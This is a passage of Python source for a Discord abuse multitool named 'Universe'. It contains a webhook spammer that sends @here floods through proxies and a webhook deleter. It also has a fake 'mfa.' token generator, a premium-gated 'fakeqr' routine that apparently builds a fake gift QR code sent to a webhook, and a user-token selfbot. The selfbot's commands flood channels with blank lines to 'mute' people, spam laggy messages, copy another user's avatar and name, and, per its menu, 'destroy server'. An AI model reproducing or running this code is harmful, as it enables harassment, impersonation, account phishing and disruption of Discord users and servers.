                    if os.path.isfile("Temp/discord_gift.png"):
                        os.remove('Temp/discord_gift.png')
                    driver.close()
                    break
        if idlog == premium_saveid and premium_status == "exact":
            webhook = input(f'{Universe.print.input}Enter Your Webhook : ')
            fakeqr(webhook)
            Universe.pause()
            launch()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()
    if cmd == "discord":
        menulist = ["selfbot", "raidbot", "webhook", "gen", "bot"]
        Universe.print.menu(menulist)
        Universe.pause()
        launch()
    if cmd == "bot":
        menulist = ["send", "embed"]
        Universe.print.menu(menulist)
        Universe.pause()
        launch()
    if cmd == "send":
        sendbot = commands.Bot(command_prefix=".")
        logoprincipal()
        Universe.print.normal(True, f"Discord Commands = .stop, .send <message>")
        Universe.print.normal(True, f"You Must Have a token Bot Valid")

        @sendbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            Universe.print.normal(f"{sendbot.user.name} has logged out successfully.")

        @sendbot.command()
        async def send(ctx, *message45):
            await ctx.message.delete()
            message45 = " ".join(message45)
            await ctx.send(message45)

        token2 = input(f"{Universe.print.input}Enter Token Bot Valid : ")
        sendbot.run(token2)
        launch()
    if cmd == "embed":
        embedbot = commands.Bot(command_prefix=".")
        logoprincipal()
        Universe.print.normal(True, f"Discord Commands = .stop, .embed <title> <text>")
        Universe.print.normal(True, f"You Must Have a Token Bot Valid")
        text1msg = input(f'{Universe.print.input}Enter The Title Of Embed : ')
        text2msg = input(f'{Universe.print.input}Enter The Message of Embed : ')

        @embedbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            Universe.print.normal(True, f"{client.user.name} has logged out successfully")

        @embedbot.command(pass_context=True)
        async def embed(ctx, text1msg, text2msg):
            await ctx.message.delete()
            embed = discord.Embed(
                title=text1msg,
                description=text2msg
            )
            await ctx.send(embed=embed)

        token3 = input(f'{Universe.print.input}Enter Bot Token : ')

        embedbot.run(token3)
        launch()
    if cmd == "gen":
        menulist = ["token", "vanity", "nitrolink"]
        Universe.print.menu(menulist)
        Universe.pause()
        launch()
    if cmd == "token":
        logoprincipal()
        chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

        ilosc = input(f"{Universe.print.input}How many tokens to generate: ")
        ilosc = int(ilosc)

        for i in range(ilosc):
            token1 = ""
            token2 = ""

            for c in range(84):
                token1 += random.choice(chars)

            token2 = 'mfa.'

            token1 = str(token1)
            token2 = str(token2)

            token = token2 + token1
            if not os.path.isfile("Temp/tokens.txt"):
                f = open("Temp/tokens.txt", "w+")
                f.close()
            if os.path.isfile("Temp/tokens.txt"):
                with open('Temp/tokens.txt', 'a') as txt:
                    txt.write(token + "\n")
        Universe.print.normal(True, 'Finished !')
        Universe.print.normal(True, 'All Tokens : Temp/tokens.txt ')
        Universe.pause()
        launch()
    if cmd == "vanity":
        logoprincipal()
        custom = input(f"{Universe.print.input}Enter The Name Of Vanity Link (example>nitro): ")
        invite = input(f"{Universe.print.input}Enter The Invite Of Vanity Link (exemple>discord.gg/Jz95dqPe): ")
        vv = Universe.banner.vanitymethod
        vanity = vv.replace('{custom}', custom).replace('{invite}', invite)
        pyperclip.copy(vanity)
        Universe.print.normal(True, f"The Link Has Been Copied !")
        Universe.pause()
        launch()
    if cmd == "webhook":
        Universe.print.normal(True, 'wstatus')
        Universe.print.normal(True, 'wspam')
        Universe.print.normal(True, 'winfo')
        Universe.print.normal(True, 'wkill')
        Universe.print.normal(True, 'wedit')
        Universe.pause()
        launch()
    if cmd == "wstatus":
        logoprincipal()
        url = input(f'{Universe.print.input}Enter the webhook for get status : ')
        logoprincipal()
        code = requests.get(url).status_code
        status = "Online"
        s = requests.get(url).text
        ss = json.loads(s)
        r = ss.get('message')
        if r == "Unknown Webhook":
            status = "Offline"
        printbar = Universe.banner.horizontal_bar * 12
        Universe.print.center(f'<<{printbar}Webhook Code{printbar}>>')
        Universe.print.normal(True, f'{code}')
        Universe.print.center(f'<<{printbar}Webhook Status{printbar}>>')
        Universe.print.normal(True, f'{online}')
        Universe.pause()
        launch()
    if cmd == "winfo":
        logoprincipal()
        url = input(f'{Universe.print.input}Enter the webhook for get info : ')
        r = requests.get(url).text
        rr = json.loads(r)
        wname = rr.get('name')
        wavatar = rr.get('avatar')
        wtype = rr.get('type')
        wid = rr.get('id')
        wchannelid = rr.get('channel_id')
        wguildid = rr.get('guild_id')
        wapplicationid = rr.get('application_id')
        wtoken = rr.get('token')
        logoprincipal()
        Universe.print.center(f'<<{printbar}Infos{printbar}>>')
        Universe.print.normal(True, f'{wname}')
        Universe.print.normal(True, f'{wavatar}')
        Universe.print.normal(True, f'{wtype}')
        Universe.print.normal(True, f'{wid}')
        Universe.print.normal(True, f'{wchannelid}')
        Universe.print.normal(True, f'{wguildid}')
        Universe.print.normal(True, f'{wapplicationid}')
        Universe.print.normal(True, f'{wtoken}')
        Universe.pause()
        launch()
    if cmd == "wedit":
        logoprincipal()
        webhookedit = input(f'{Universe.print.input}Enter the webhook for edit : ')
        r = requests.get(webhookedit).text
        rr = json.loads(r)
        if not rr.get('code'):
            logoprincipal()
            nameedit = input(f"{Universe.print.input}Enter The Name : ")
            r = requests.patch(f"{webhookedit}", json={"name": f"{nameedit}"})
        if rr.get('code'):
            logoprincipal()
            Universe.print.normal(True, 'The webhook has been deleted !')
        Universe.pause()
        launch()
    if cmd == "wkill":
        logoprincipal()
        webhookDeleteRe = input(f"{Universe.print.input}Enter The Webhook ~> ")
        time.sleep(0.5)
        os.system(f'curl -X "DELETE" {webhookDeleteRe}')
        time.sleep(0.5)
        Universe.print.normal(True, f"Webhook Deleted !")
        Universe.pause()
        launch()
    if cmd == "wspam":
        logoprincipal()
        thread1 = []
        embedlol = {
            "description": "Your Webhook Has Been Spammed",
            "title": "Universe"
        }
        data = {
            "content": ">||@here||<",
            "username": "Universe Spam",
            "embeds": [
                embedlol
            ],
        }
        amount = int(input(f'{Universe.print.input}Amount of messages : '))
        url = input(f"{Universe.print.input}Webhook : ")
        for i in range(amount):
            response = requests.post(url, json=data, proxies={"http": f'{Universe.proxy.proxy()}'})
            if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                Universe.print.normal(True, "Message Sended")
            elif response.status_code == 429:
                time.sleep(3)
            else:
                Universe.print.error("Message Not Sended")
        Universe.print.normal(True, "Finished Spamming")
        Universe.pause()
        launch()
    if cmd == "selfbot":
        if not os.path.isfile("St/e1/cookie2.txt"):
            Universe.clear()
            Universe.print.event("""
            If you use commands with password,
            You will need for lifetime
            a email and a number or your
            account will be offline
            """)
            alertmessage = input(f"{Universe.print.input} Enter 'ok' for accept the prevention : ")
            if alertmessage == "ok":
                f = open("St\e1\cookie2.txt", "w+")
                f.write("nil")
                f.close()
                pass
            if not alertmessage == "ok":
                launch()

        loop = asyncio.get_event_loop()

        m_numbers = [
            ":one:",
            ":two:",
            ":three:",
            ":four:",
            ":five:",
            ":six:"
        ]

        m_offets = [
            (-1, -1),
            (0, -1),
            (1, -1),
            (-1, 0),
            (1, 0),
            (-1, 1),
            (0, 1),
            (1, 1)
        ]

        def startprint():
            logoprincipal()
            # Selfbot
            g = f"\033[38;2;1;1;255m"
            gg = f"\033[38;2;1;1;220m"
            g_3 = f"\033[38;2;1;1;200m"
            g_4 = f"\033[38;2;1;1;180m"
            g_5 = f"\033[38;2;1;1;140m"
            g_6 = f"\033[38;2;1;1;125m"
            g_7 = f"\033[38;2;1;1;100m"
            r = f"{Fore.RESET}"
            selfbot = requests.get(f"https://pastebin.com/raw/XguwJq5i").text
            selfbot = selfbot.replace('{g}', f'{g}').replace('{gg}', f'{gg}').replace('{g_3}', f'{g_3}').replace(
                '{g_4}', f'{g_4}').replace('{r}', f'{r}').replace('{Tokon.user.id}', f'{Tokon.user.id}').replace(
                '{Tokon.command_prefix}', f'{Tokon.command_prefix}')
            print(selfbot)
        Universe.clear()
        def Init():
            try:
                token = Universe.crypt.decode("T")
                Tokon.run(token, bot=False, reconnect=True)
            except discord.errors.LoginFailure:
                Universe.print.error('Failed To Login With Token')
                Universe.pause()
                quit()

        class Login(discord.Client):
            async def on_connect(self):
                guilds = len(self.guilds)
                users = len(self.users)
                print("")
                print(f"Connected to: [{self.user.name}]")
                print(f"Token: {self.http.token}")
                print(f"Guilds: {guilds}")
                print(f"Users: {users}")
                print("-------------------------------")
                await self.logout()

        def async_executor():
            def outer(func):
                @functools.wraps(func)
                def inner(*args, **kwargs):
                    thing = functools.partial(func, *args, **kwargs)
                    return loop.run_in_executor(None, thing)

                return inner

            return outer

        def Nitro():
            code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            return f'https://discord.gift/{code}'

        def RandomColor():
            randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
            return randcolor

        def RandString():
            return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

        Tokon.mee6 = False
        Tokon.mee6_channel = None
        Tokon.yui_kiss_user = None
        Tokon.yui_kiss_channel = None
        Tokon.yui_hug_user = None
        Tokon.yui_hug_channel = None
        Tokon.sniped_message_dict = {}
        Tokon.sniped_edited_message_dict = {}
        Tokon.blocked_users = {}
        Tokon.mute = None
        Tokon.silentmute = None
        Tokon.muted_id = [708375470185644133, 235148962103951360, 858765527887249418]
        Tokon.automessage = None
        Tokon.automessagecontent = None
        Tokon.automessagedelay = None
        # Anti Category
        Tokon.antimassdm = False
        # Last Command
        Tokon.lastcommand = None
        # Customization
        Tokon.theme = "ini"
        Tokon.prevent = "ini"
        Tokon.footer = f"tokon.site.xyz/universedoc"
        Tokon.author = f"Universe"
        # Function Theme
        def on_theme(argument):
            if Tokon.theme == "diff":
                final = argument.replace('[', '-').replace(']', '')
                argument = final
            elif Tokon.theme == "fix":
                final = argument.replace('[', '-').replace(']', '')
                argument = final
            elif Tokon.theme == "blor":
                final = argument.replace('-', '[').replace('=', ']')
                argument = final
            else:
                pass
            return argument
        # Remove command
        Tokon.remove_command('help')

        @Tokon.event
        async def on_connect():
            Universe.clear()
            startprint()

        @Tokon.event
        async def on_command_error(ctx, error):
            error_str = str(error)
            error = getattr(error, 'original', error)
            if isinstance(error, commands.CommandNotFound):
                return
            elif isinstance(error, commands.CheckFailure):
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command" + Fore.RESET)
            elif isinstance(error, commands.MissingRequiredArgument):
                Universe.print.error(f"Missing arguments: {error}")
            elif isinstance(error, numpy.AxisError):
                Universe.print.error(f"Not a valid image")
            elif "Cannot send an empty message" in error_str:
                Universe.print.error(f"Couldnt send a empty message")
            else:
                return

        @Tokon.event
        async def on_message_edit(before, after):
            await Tokon.process_commands(after)

        @Tokon.event
        async def on_message(message):
            if Tokon.mute is not None and Tokon.mute.id == message.author.id:
                await message.channel.send(f'{Universe.banner.invisiblechar}' + '\n' * 800 + f'{Universe.banner.invisiblechar}' + '\n' + "**You are Muted | You can't send messages**")
            if Tokon.silentmute is not None and Tokon.silentmute.id == message.author.id:
                await message.channel.send(f'{Universe.banner.invisiblechar}' + '\n' * 800 + f'{Universe.banner.invisiblechar}')
            if Tokon.automessage is not None and Tokon.automessage.id == message.author.id:
                if Tokon.automessagedelay == None:
                    pass
                else:
                    time.sleep(int(Tokon.automessagedelay))
                await message.channel.send(Tokon.automessagecontent)
            cvcord = await Tokon.get_context(message)
            if cvcord.valid:
                Universe.print.normal(True, f'Command Executed > {message.content}')
                if f"{Tokon.command_prefix}rep" in message.content:
                    pass
                else:
                    Tokon.lastcommand = message.content
            await Tokon.process_commands(message)

        @Tokon.event
        async def on_message_delete(message):
            if message.author.id == Tokon.user.id:
                return

        @Tokon.event
        async def on_message_edit(before, after):
            if before.author.id == Tokon.user.id:
                return
            if len(Tokon.sniped_edited_message_dict) > 1000:
                Tokon.sniped_edited_message_dict.clear()
            attachments = before.attachments
            if len(attachments) == 0:
                channel_id = before.channel.id
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                Tokon.sniped_edited_message_dict.update({channel_id: message_content})
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                channel_id = before.channel.id
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                Tokon.sniped_edited_message_dict.update({channel_id: message_content})

        @Tokon.command()
        async def adminservers(ctx):
            await ctx.message.delete()
            admins = []
            bots = []
            kicks = []
            bans = []
            for guild in Tokon.guilds:
                if guild.me.guild_permissions.administrator:
                    admins.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
                    bots.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
                    bans.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
                    kicks.append(discord.utils.escape_markdown(guild.name))
            adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
            botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
            banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
            kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
            await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

        @Tokon.command()
        async def bots(ctx):
            await ctx.message.delete()
            bots = []
            for member in ctx.guild.members:
                if member.bot:
                    bots.append(
                        str(member.name).replace("`", "\`").replace("*", "\*").replace("_",
                                                                                       "\_") + "#" + member.discriminator)
            bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
            await ctx.send(bottiez)

        PremiumOnly = "(**Premium**)"


        @Tokon.command()
        async def help(ctx):
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[general]       {Universe.banner.doublearrow} general cmds
[account]       {Universe.banner.doublearrow} account cmds
[text]          {Universe.banner.doublearrow} text cmds
[fun]           {Universe.banner.doublearrow} fun cmds
[picture]       {Universe.banner.doublearrow} picture cmds    
[premium]       {Universe.banner.doublearrow} premium cmds
[bypass]        {Universe.banner.doublearrow} bypass cmds
[animation]     {Universe.banner.doublearrow} animations cmds
[shortcut]      {Universe.banner.doublearrow} shortcuts cmds
[protection]    {Universe.banner.doublearrow} protections cmds
[raid]          {Universe.banner.doublearrow} raid cmds
[nettools]      {Universe.banner.doublearrow} nettools cmds
[customization] {Universe.banner.doublearrow} customize cmds
[troll]         {Universe.banner.doublearrow} troll cmds


[{Tokon.footer}]
```""")
            await ctx.message.delete()
            await ctx.send(content=content)

        @Tokon.command()
        async def general(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[clearmenu]        {Universe.banner.doublearrow} clear bot's menu
[prefix <prefix>]  {Universe.banner.doublearrow} the bot prefix
[ping]             {Universe.banner.doublearrow} bot latency 
[userinfo <user>]  {Universe.banner.doublearrow} infos about the user
[serverinfo <id>]  {Universe.banner.doublearrow} infos about the server
[serverpfp]        {Universe.banner.doublearrow} icon of the server
[banner]           {Universe.banner.doublearrow} banner of the server
[theme <theme>]    {Universe.banner.doublearrow} color of commands


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)

        @Tokon.command()
        async def account(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[ghost]                   {Universe.banner.doublearrow} Invisible Profil
[setpfp <link>]           {Universe.banner.doublearrow} change pfp by link
[hypesquad <hypesquad>]   {Universe.banner.doublearrow} change hypesquad
[spoofcon <type> <name>]  {Universe.banner.doublearrow} spoof discord connection
[acceptfriends]           {Universe.banner.doublearrow} infos about the server
[delfriends]              {Universe.banner.doublearrow} icon of the server
[ignorefriends]           {Universe.banner.doublearrow} banner of the server
[leavegc]                 {Universe.banner.doublearrow} color of commands


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)


        @Tokon.command()
        async def text(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[del <msg>]             {Universe.banner.doublearrow} send a message and delete it instantly
[speak1337]             {Universe.banner.doublearrow} talk like a gamer
[minesweeper]           {Universe.banner.doublearrow} play a game of minesweeper
[spam <amount> <msg>]   {Universe.banner.doublearrow} spam a message
[purge <amount>]        {Universe.banner.doublearrow} purge the amount of messages
[dm <user> <msg>]       {Universe.banner.doublearrow} Dm a user a message
[reverse <msg>]         {Universe.banner.doublearrow} send the message in reverse-order
[shrug]                 {Universe.banner.doublearrow} /shrug
[lenny]                 {Universe.banner.doublearrow} {Universe.banner.lenny}
[flip]                  {Universe.banner.doublearrow} /flip
[unflip]                {Universe.banner.doublearrow} /unflip
[bold <msg>]            {Universe.banner.doublearrow} bold the message
[spoil <msg>]           {Universe.banner.doublearrow} Add a spoiler to the message
[underline <msg>]       {Universe.banner.doublearrow} underline the message
[italic <msg>]          {Universe.banner.doublearrow} italicize the message
[wave <msg>]            {Universe.banner.doublearrow} add waves to the message
[greyembed <msg>]       {Universe.banner.doublearrow} greyembed the message
[onelayer <msg>]        {Universe.banner.doublearrow} add 1 ` to the message
[twolayer <msg>]        {Universe.banner.doublearrow} add 2 ` to the message
[threelayer <msg>]      {Universe.banner.doublearrow} add 3 ` to the message
[empty]                 {Universe.banner.doublearrow} send empty message
[firstmsg]              {Universe.banner.doublearrow} show 1st message
[ascii <msg>]           {Universe.banner.doublearrow} send the message in ASCII art
[thembed <msg>]         {Universe.banner.doublearrow} send a message with theme bot


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)

        @Tokon.command()
        async def fun(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[slap <user>]           {Universe.banner.doublearrow} slap user
[tickle <user>]         {Universe.banner.doublearrow} tickle user
[hug <user>]            {Universe.banner.doublearrow} hug user
[cuddle <user>]         {Universe.banner.doublearrow} cuddle user
[smug <user>]           {Universe.banner.doublearrow} smug at user
[feed <user>]           {Universe.banner.doublearrow} feed user
[pat <user>]            {Universe.banner.doublearrow} pat user
[kiss <user>]           {Universe.banner.doublearrow} kiss user
[dog]                   {Universe.banner.doublearrow} random dog pic
[fox]                   {Universe.banner.doublearrow} random fox pic
[bird]                  {Universe.banner.doublearrow} random bird pic
[cat]                   {Universe.banner.doublearrow} random cat pic
[sadcat]                {Universe.banner.doublearrow} random sadcat pic
[hack <user>]           {Universe.banner.doublearrow} hack user


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)


        @Tokon.command()
        async def picture(ctx, category=None):
            if category is None:
                await ctx.message.delete()
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[tweet <user>]          {Universe.banner.doublearrow} fake tweet
[fry <user>]            {Universe.banner.doublearrow} fry user's pfp
[blurpify <user>]       {Universe.banner.doublearrow} blurpify user's pfp
[magik <user>]          {Universe.banner.doublearrow} distort user's pfp


[{Tokon.footer}]
```""")
                await ctx.send(content=content)

        @Tokon.command()
        async def premium(ctx, category=None):
            if category is None:
                await ctx.message.delete()
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[rep]                              {Universe.banner.doublearrow} repeat the last command
[userpfp <user>]                   {Universe.banner.doublearrow} get the user's pfp
[userinfo <user>]                  {Universe.banner.doublearrow} get the user's infos
[putpfp <user>]                    {Universe.banner.doublearrow} put the user's pfp
[putname <user>]                   {Universe.banner.doublearrow} put the user's name
[copyuser <user>]                  {Universe.banner.doublearrow} put user's pfp and name on your profil
[read]                             {Universe.banner.doublearrow} read all discord notifications
[rainbow <role>]                   {Universe.banner.doublearrow} change role's color to rainbow
[kill]                             {Universe.banner.doublearrow} destroy server
[massreact <emoji>]                {Universe.banner.doublearrow} react 10 last messages with emoji
[lagpc <amount>]                   {Universe.banner.doublearrow} spam a laggy message for pc
[automessage <user> <delay> <msg>] {Universe.banner.doublearrow} send the message when user send a message
[unautomessage]                    {Universe.banner.doublearrow} stop automessage user
[silentmute <user>]                {Universe.banner.doublearrow} mute user in silent mode
[unsilentmute]                     {Universe.banner.doublearrow} stop silentmute user
[mute <user>]                      {Universe.banner.doublearrow} mute user in normal mode
[unmute]                           {Universe.banner.doublearrow} stop mute user
[copyserver]                       {Universe.banner.doublearrow} make a copy of the server
[clear]                            {Universe.banner.doublearrow} clear the chat discord
[nitro]                            {Universe.banner.doublearrow} send a random nitro code
[ano <msg>]                        {Universe.banner.doublearrow} send a message anonymously


[{Tokon.footer}]
```""")
                await ctx.send(content=content)

        @Tokon.command()
        async def bypass(ctx, category=None):
            await ctx.message.delete()
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[linkvertise <link>]       {Universe.banner.doublearrow} bypass linkvertise link
[blockmsg <user> <msg>]    {Universe.banner.doublearrow} send a message to a person you blocked


[{Tokon.footer}]
```""")
            await ctx.send(content=content)

        @Tokon.command()
        async def animation(ctx):
            await ctx.message.delete()
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[tokon]      
[blueanim <msg>]   (bugs)        
[boldanim <msg>] 
[layeranim <msg>]  


[{Tokon.footer}]
```""")
            await ctx.send(content=content)

        @Tokon.command()
        async def shortcut(ctx):
            await ctx.message.delete()
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[etherium]             {Universe.banner.doublearrow} current etherium exchange rate
[bitcoin]              {Universe.banner.doublearrow} current bitcoin exchange rate
[thembed <msg>]        {Universe.banner.doublearrow} send a message with theme bot
[ascii <msg>]          {Universe.banner.doublearrow} send the message in ASCII art
[hastebin <message>]   {Universe.banner.doublearrow} post message in hastebin site


[{Tokon.footer}]
```""")
            await ctx.send(content=content)
                
        @Tokon.command()
        async def admin(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe", icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                description = f"""```
{Tokon.command_prefix}adminservers  {Universe.banner.doublearrow} list servers u have perm
                                ```"""
                embed.description = f"{description}"
                await ctx.message.edit(content='{Universe.banner.invisiblechar}' + '\n' * 1 + '{Universe.banner.invisiblechar}')
                await ctx.message.edit(embed=embed)

        @Tokon.command()
        async def image(ctx, *, args):
            await ctx.message.delete()
            url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
            page = requests.get(url)
            soup = bs4(page.text, 'html.parser')
            image_tags = soup.findAll('img')
            if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
                link = image_tags[2]['src']
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(link) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(f"Search result for: **{args}**",
                                       file=discord.File(file, f"Tokon_anal.png"))
                except:
                    await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
            else:
                await ctx.send("Nothing found for **" + args + "**")

        @Tokon.command()
        async def hack(ctx, user):
            await ctx.message.delete()
            number123 = ["0,04", "0,08", "0,1", "0,09", "0,2"]
            randomMoneyBTC = "".join(random.choices(number123))
            dong = ""
            message = await ctx.send(f"**[0.00%] Hacking** {user}")
            time.sleep(3)
            await message.edit(content=f"**[5.97%] Finding discord login... (2fa bypassed) ** {user}")
            time.sleep(5)
            await message.edit(content=f"**[26.34%] Finding cookies... ** {user}")
            time.sleep(2)
            await message.edit(content=f"**[59.72%] Taking Ip Address... ** {user}")
            time.sleep(4)
            await message.edit(content=f"**[83.11%] Taking Data... ** {user}")
            time.sleep(1.5)
            await message.edit(content=f"**[98.06%] Sell Data To Darkweb... ** {user}")
            time.sleep(3)
            await message.edit(
                content=f"**[100.00%]** {user} **has been hacked | Bitcoin You Get : {randomMoneyBTC}**")

        @Tokon.command()
        async def lagpc(ctx, amount: int):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for _i in range(amount):
                    await ctx.send(
                        ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def stop(ctx):
            voice = discord.utils.get(Tokon.voice_clients, guild=ctx.guild)
            voice.stop()

        @Tokon.command()
        async def copyuser(ctx, user: discord.User):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                password = input('Enter Password : ')
                with open('St/e1/Scookie/pfpsteal.png', 'wb') as f:
                    r = requests.get(user.avatar_url, stream=True)
                    for block in r.iter_content(1024):
                        if not block:
                            break
                        f.write(block)
                try:
                    Image.open('St/e1/Scookie/pfpsteal.png').convert('RGB')
                    with open('St/e1/Scookie/pfpsteal.png', 'rb') as f:
                        await Tokon.user.edit(password=password, avatar=f.read(), username=f"{user.name}")
                except discord.HTTPException as e:
                    Universe.print.error(e)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def putpfp(ctx, user: discord.User):
            if idlog == premium_saveid and premium_status == "exact":
                password = input(f'{Universe.print.input}Enter Password : ')
                with open('St/e1/Scookie/pfpsteal.png', 'wb') as f:
                    r = requests.get(user.avatar_url, stream=True)
                    for block in r.iter_content(1024):
                        if not block:
                            break
                        f.write(block)
                try:
                    Image.open('St/e1/Scookie/pfpsteal.png').convert('RGB')
                    with open('St/e1/Scookie/pfpsteal.png', 'rb') as f:
                        await Tokon.user.edit(password=password, avatar=f.read())
                except discord.HTTPException as e:
                    Universe.print.error(e)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def putname(ctx, user: discord.User):
            if idlog == premium_saveid and premium_status == "exact":
                try:
                    await Tokon.user.edit(password=password, name=user.name)
                except discord.HTTPException as e:
                    Universe.print.error(e)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def ano(ctx, *, _message):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(f'{Universe.banner.invisiblechar}' + '\n' * 800 + f'{Universe.banner.invisiblechar}' + '\n' + _message)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def unmute(ctx, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    await ctx.send("Now unmuted " + str(Tokon.mute))
                    Tokon.mute = None
            else:
                await ctx.send('***Premium Invalid***')
                    
        @Tokon.command()
        async def mute(ctx, user: discord.User, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    if not Tokon.mute == user:
                        Tokon.mute = user
                        await ctx.send("Now muted " + str(Tokon.mute))
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def unsilentmute(ctx, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    await ctx.send("Now unmuted " + str(Tokon.silentmute))
                    Tokon.silentmute = None
            else:
                await ctx.send('***Premium Invalid***')
